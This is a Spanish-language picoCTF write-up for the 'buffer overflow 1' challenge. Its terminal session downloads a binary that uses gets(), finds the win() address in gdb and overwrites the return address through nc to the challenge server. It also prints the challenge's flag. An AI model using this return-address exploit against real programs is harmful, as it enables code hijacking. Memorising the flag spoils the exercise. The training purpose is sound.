## Descripción 
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 63594`
## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
```bash
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ mkdir bufferoverflow1   
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ cd bufferoverflow1 
                                                                                 
                                                                                                                                                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/185/vuln  
--2024-11-15 16:46:07--  https://artifacts.picoctf.net/c/185/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.21.85, 13.249.21.46, 13.249.21.66, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.21.85|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15704 (15K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                      100%[====================================================================================>]  15.34K  --.-KB/s    in 0s      

2024-11-15 16:46:08 (145 MB/s) - ‘vuln’ saved [15704/15704]

                                                                                                                                                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/185/vuln.c
--2024-11-15 16:46:18--  https://artifacts.picoctf.net/c/185/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.21.32, 13.249.21.66, 13.249.21.46, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.21.32|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 769 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                    100%[====================================================================================>]     769  --.-KB/s    in 0s      

2024-11-15 16:46:18 (9.23 MB/s) - ‘vuln.c’ saved [769/769]

                                                                                                                                                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ gdb vuln   
GNU gdb (Debian 15.1-1) 15.1
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
(gdb) quit

┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | ./vuln  
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | 
zsh: segmentation fault  ./vuln

┌──(kali㉿kali)-[~/retosBinaryExploit/bufferoverflow1]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 52217
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

- Flag: picoCTF{addr3ss3s_ar3_3asy_6462ca2d}

## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/258
